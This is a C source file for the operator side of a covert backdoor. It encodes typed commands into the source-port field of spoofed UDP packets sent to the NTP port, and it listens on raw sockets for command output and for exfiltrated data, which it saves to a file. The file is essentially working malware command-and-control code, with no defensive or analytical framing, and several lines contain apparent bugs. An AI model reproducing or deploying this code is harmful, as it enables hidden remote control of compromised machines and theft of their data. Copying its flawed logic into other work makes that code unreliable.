#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "client.h"
#include "defs.h"
#include "util.h"
#include "ntp.h"
#include "inet.h"

int closing;

void backdoor_client(uint32 ipaddr, int dport, int duplex)
{
	int sock;
//	struct sockaddr_in saddr;
	char command[MAX_LEN];
	pthread_t list_thread;
	pthread_t exfil_thread;

//	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
//	bzero(&saddr, sizeof(saddr));
	
	if (ipaddr == 0)
		error("Invalid IP specified.");

	if (!val_port(dport))
		error("Invalid destination port specified.");

//	saddr.sin_family = AF_INET;
//	saddr.sin_addr.s_addr = ipaddr;
//	saddr.sin_port = htons(dport);

	if (duplex)
	{
		closing = 0;
		pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
	}

	// exfil thread
	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
	
	printf("Ready, awaiting your command...\n");
	while(fgets(command, MAX_LEN, stdin) != NULL)
	{
		char *trans;
		int tot_len;

		tot_len = strlen(command) + 1;

		trans = buildTransmission(command, &tot_len, CMD_TYP);

		for (int i = 0; i < tot_len; i += 8)
		{
			char frame[FRAM_SZ];
			char *enc;
			char *ptr;
			int fram_len;
			ushort src_port = 0;
			ushort dst_port = 0;

			ptr = trans + i;

			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;

			memcpy(frame, ptr, fram_len);

//			enc = encrypt(SEKRET, frame, FRAM_SZ);

//			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));

//			free(enc);
//			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
			src_port = (SIGNTR << 8) + frame[i];
			dst_port = PORT_NTP;

//			printf("Src: %d\n", src_port);
			
			_sendUDP(ipaddr, src_port, dst_port, TRUE);
			
			usleep(SLEEP_TIME);
		}

		free(trans);
	}	

	// Listen thread cleanup
	if (duplex)
	{
		closing = 1;
		pthread_join(list_thread, NULL);
	}

	pthread_join(exfil_thread, NULL);
}

void *listen_thread(void *arg)
{
	struct sockaddr_in saddr = *(struct sockaddr_in*)arg;
	int sock;
	char buf[MAX_LEN];
	int buf_len = 0;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock < 0)
		error("unable to open listening raw socket");
	
	saddr.sin_addr.s_addr = LOCALHOST; // TODO: Use an actual address instead of localhost
	if (bind(sock, (struct sockaddr*)&saddr, sizeof(saddr)) < 0)
		error("Unable to bind result port.\n");

	while(!closing)
	{
		char packet[MAX_LEN];
		char *ptr;
		char *data;
		char *dec;
		char type;
		int  pack_len;

		pack_len = read(sock, &packet, MAX_LEN);

		// Step 1: locate the payload portion of the packet
		if (pack_len - IP_UDP_LEN <= 0)
			continue;
		ptr = (char *)(packet + IP_UDP_LEN);

		// Step 2: check for signature

		// Step 3: dump data into buffer
//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
		data = buf + buf_len;
		memcpy(data, ptr, FRAM_SZ);
//		free(dec);

		buf_len += pack_len - IP_UDP_LEN;

		// Step 4: see if we have a full transmission
		data = getTransmission(buf, &buf_len, &type);
		if (data == NULL)
			continue;

		// Step 5: show the results
		if (type == RSP_TYP)
			printf("%s", data);

		// Step 6: reset buffer
		memset(buf, 0, MAX_LEN);
		buf_len = 0;
		free(data);
		data = 0;
	}

	return NULL;
}

int val_port(int port)
{
	if (0 < port && port < 65535)
		return 1;
	else 
		return 0;
}

void* exfil_listen(void *arg)
{
	int sock;
	char buf[MAX_LEN];
	uint64 timestamp;
	char fname[MAX_LEN];
	FILE* file;
//	uint32 src_addr = *(uint32*)arg;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock < 0)
		error("unable to open exfil raw socket");

	timestamp = get_sec();
	sprintf(fname, "%llX", timestamp);
	file = open_file(fname, TRUE);

	while (TRUE)
	{
		char *data;
		char type;
		int len;

		len = read(sock, &buf, MAX_LEN);

		data = getTransmission(buf, &len, &type);

		if (type == XFL_TYP)
		{
			printf("%s", data);
			fwrite(data, 2, 1, file);
		}

		free(data);
	}

	fclose(file);
	close(sock);

	return NULL;
}
